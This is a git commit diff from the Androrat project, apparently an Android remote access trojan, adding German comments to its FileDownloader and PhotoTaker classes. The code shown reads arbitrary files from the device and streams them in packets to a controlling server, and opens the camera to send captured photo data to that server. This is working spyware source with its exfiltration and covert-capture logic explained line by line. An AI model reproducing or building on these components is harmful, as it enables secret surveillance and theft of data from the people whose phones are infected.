789a6b4355e33b8a52209adbde68cfee29d7bf93
alagai-ka <alagai_ka@web.de>
2015-06-03 23:12:14 +0200

    Comment on FileDownloader and PhotoTaker

--- src/Androrat/src/my/app/Library/FileDownloader.java
+++ src/Androrat/src/my/app/Library/FileDownloader.java
@@ -10,64 +10,175 @@ import my.app.client.ClientListener;
 
 import Packet.FilePacket;
 
+/**
+ * Diese Klasse ist dazu da Ordner oder Datei von dem Gerät herunterzuladen.
+ */
 public class FileDownloader {
-
+	/**
+	 * ctx	Der Service der ein Objekt dieser Klasse erstellt.
+	 */
 	ClientListener ctx;
+	/**
+	 * finalData Diese Variable wird nicht verwendet.
+	 */
 	byte[] finalData;
+	/**
+	 * in	Ein Filestream
+	 */
 	InputStream in;
+	/**
+	 * f	Der Ordner
+	 */
 	File f;
+	/**
+	 * channel	 Der Kanal zur Datenübertragung
+	 */
 	int channel;
+	/**
+	 * packet  Das Paket um die Daten zu versenden.
+	 */
 	FilePacket packet;
+	/**
+	 * buffer	Ein Byte-Array das später benötigt wird um die Daten zwischen zu speichern.
+	 */
 	byte[] buffer;
+	/**
+	 * numseq	Die Sequenznummer der Pakete
+	 */
 	short numseq = 0;
+	/**
+	 * BUFF_SIZE 	Größe des Buffers und des Packets.
+	 */
 	int BUFF_SIZE = 4096;
-	
+
+	/**
+	 * Der Konstruktor der Klasse. Er speichert den übergebenen ClientListener in der Klassenvariablen ab.
+	 * @param c	Der Service der dieses Objekt erstellt.
+	 */
 	public FileDownloader(ClientListener c) {
 		ctx = c;
 	}
-	
+
+	/**
+	 * Diese Funktion erstellt ein Thread in welchem die Datei oder der Ordner heruntergeladen wird.
+	 * @param s	Der Ordner welcher heruntergeladen werden soll.
+	 * @param chan Der Kanal zur Datenübermittlung
+	 * @return	true falls heruntergeladen wurde, false falls dies nicht geklappt hat.
+	 */
 	public boolean downloadFile(String s, int chan) {
+		/**
+		 * Klassenvariable befüllen
+		 */
 		channel = chan;
+		/**
+		 * neunes File-Objekt erstellen mit dem Ordnerpfad.
+		 */
 		f = new File(s);
 		try {
+			/**
+			 * Versuchen einen neuen Stream zum auslesen der Daten in dem Ordner f zu erstellen.
+			 */
 			in = new FileInputStream(f);
 		} catch (FileNotFoundException e) {
+			/**
+			 * Sollte der Ordner nicht gefunden werden so wird false zurückgegeben.
+			 */
 			return false;
 		}
-
+		/**
+		 * Erstellen eines neuen Threads um die Daten herunterzuladen
+		 */
         Thread loadf = new Thread(new Runnable() {
         	public void run() {
         		load();
         	}
         });
+		/**
+		 * Straten des Threads
+		 */
         loadf.start();
-        
+		/**
+		 * True zurückgeben.
+		 */
 		return true;
 	}
-	
+
+	/**
+	 * Diese Methode wird in dem eigens erstellten Thread aufgerufen.
+	 * Sie dient dazu die Daten des Ordner herunterzuladen.
+	 */
 	public void load() {
 		try {
+			/**
+			 * Schleife
+			 */
 			while(true) {
+				/**
+				 * Erstellen des Buffers mit der BUFFER_SIZE als Größe
+				 */
 				buffer = new byte[BUFF_SIZE];
+				/**
+				 * Auslesen der Daten. Der Buffer bestimmt die Größe der auszulesenden Daten.
+				 * Read ist die Anzahl der gelesen bytes.
+				 */
 				int read = in.read(buffer);
+				/**
+				 * Sollte read -1 sein so wurden keine Daten gelesen. Und die Schleife wird beendet.
+				 */
 				if (read == -1) {
 					break;
 				}
+				/**
+				 * Überprüfen ob read gleich der BUFFER_SIZE ist.
+				 */
 				if (read == BUFF_SIZE) {
+					/**
+					 * Erstellen eines neuen FilePacket mit der Sequenz Nummer und dem Buffer.
+					 */
 					packet = new FilePacket(numseq, (byte) 1, buffer);
+					/**
+					 * Dieses Paket bauen und über den Kanal an den Server senden.
+					 */
 					ctx.handleData(channel, packet.build());
+					/**
+					 * Die Sequenznummer um eins erhöhnen
+					 */
 					numseq ++;
 				}
+				/**
+				 * Sollte read ungleich der BUFFER_SIZE sein so handelt es sich um das letze Paket.
+				 */
 				else {//C'était le dernier paquet
+					/**
+					 * Erstellen eines neuen Buffers tmp mit der Größe der ausgelesenen Bytes
+					 */
 					byte[] tmp = new byte[read];
+					/**
+					 * Kopieren der Bytes aus der Vaiablen buffer in tmp
+					 */
 					System.arraycopy(buffer, 0, tmp, 0, read);
+					/**
+					 * Neues Packet erstellen mit tmp
+					 */
 					packet = new FilePacket(numseq, (byte) 0, tmp);
+					/**
+					 * Das Paket bauen und anschließend versenden
+					 */
 					ctx.handleData(channel, packet.build());
+					/**
+					 * Danach wird die Schleife beendet.
+					 */
 					break;
 				}
 			}
+			/**
+			 * Der Filestream wird geschlossen
+			 */
 			in.close();
 		}
+		/**
+		 * Sollte eine Exception geworfen werden so wird eine Fehlermeldung erstellt.
+		 */
 		catch(IOException e) {
 			ctx.sendError("IOException loading file");
 		}
--- src/Androrat/src/my/app/Library/PhotoTaker.java
+++ src/Androrat/src/my/app/Library/PhotoTaker.java
@@ -13,24 +13,55 @@ import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 
+/**
+ * Mit dieser Klasse sollten eigentlich Fotos erstellt werden und diese an den Server gesendet werden.
+ * Allerdings scheint das erstellen des Fotos nicht zu funktionieren.
+ */
 public class PhotoTaker {
-
+	/**
+	 * cam Der Manager für den Kamera
+	 */
 	Camera cam;
+	/**
+	 * ctx Der Service der das Objekt erstell oder die Methode aufruft.
+	 */
 	ClientListener ctx;
+	/**
+	 * chan Der Kanal für die Datenübertragung
+	 */
 	int chan ;
+	/**
+	 * Ein Interface mit dem man die Größe und das Format eine Surface bestimmen kann. Außerdem können hiermit Pixel auf dieser Flächer verändet werden.
+	 */
 	SurfaceHolder holder;
-	
+	/**
+	 * pic Ein Interface um Bilddaten eines Fotoschuss zu erhalten.
+	 */
 	private PictureCallback pic = new PictureCallback() {
-
+		/**
+		 * Diese Funktion wird aufgerufen sobald Fotodaten vorhanden sind, nachdem ein Foto aufgenommen wurde.
+		 * @param data	Die Fotodaten
+		 * @param camera	Die Kamera die es aufgenommen hat
+		 */
 	    public void onPictureTaken(byte[] data, Camera camera) {
-	    		
+			/**
+			 * Hier werden die Daten verschickt.
+			 */
 	    	ctx.handleData(chan, data);
 	        Log.i("PhotoTaker", "After take picture !");
+			/**
+			 * Und die Kamera cam gelöscht.
+			 */
 	        cam.release();
 	        cam = null;
 	    }
 	};
-	
+
+	/**
+	 * Konstrukto der Klasse
+	 * @param c Der Service der das Objekt erstellt
+	 * @param chan	Der Kanal zur Datenübertragung.
+	 */
 	public PhotoTaker(ClientListener c, int chan) {
 		this.chan = chan ;
 		ctx = c;
@@ -42,29 +73,54 @@ public class PhotoTaker {
 		ctx.star
 	}
 	*/
-	
+
+	/**
+	 * Zum Erstellen von Fotos.
+	 * @return True falls das Foto aufgenommen wurde, falls sonst.
+	 */
 	public boolean takePhoto() {
+		/**
+		 * Überprüfen ob die Kamera vorhanden ist.
+		 */
         if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
-        	return false;
+		/**
+		 * Ist keine Kamera vorhanden wird false Returned.
+		 */
+			return false;
         Log.i("PhotoTaker", "Just before Open !");
         try {
+			/**
+			 * Kreiert ein Kamera objekt, welches den Zugriff auf die Hardwarekamera zulässt.
+			 */
         	cam = Camera.open();
         } catch (Exception e) { return false; }
         
         Log.i("PhotoTaker", "Right after Open !");
-        
+		/**
+		 * Sollte man keine Zugriff auf die Kamerahardware erhalten so wird false returned.
+		 */
         if (cam == null)
         	return false;
         
         SurfaceView view = new SurfaceView(ctx);
         try {
         	holder = view.getHolder();
+			/**
+			 * Hiermit soll ein LivePreview ermöglicht werden. Diese wird auf der Surface dargestellt.
+			 */
         	cam.setPreviewDisplay(holder);
         } catch(IOException e) { return false; }
-        
+		/**
+		 * Erstellen des Fotos und die Preview wird auf dem Screen angezeigt.
+		 */
         cam.startPreview();
+		/**
+		 * Das Bild wird aufgenommen.
+		 */
         cam.takePicture(null, null, pic);
-
+		/**
+		 * Sollte man hierangekommen sein hat man erfolgreich ein Foto erstellt. Daher wir true zurückgeliefert.
+		 */
         return true;
 	}
 	
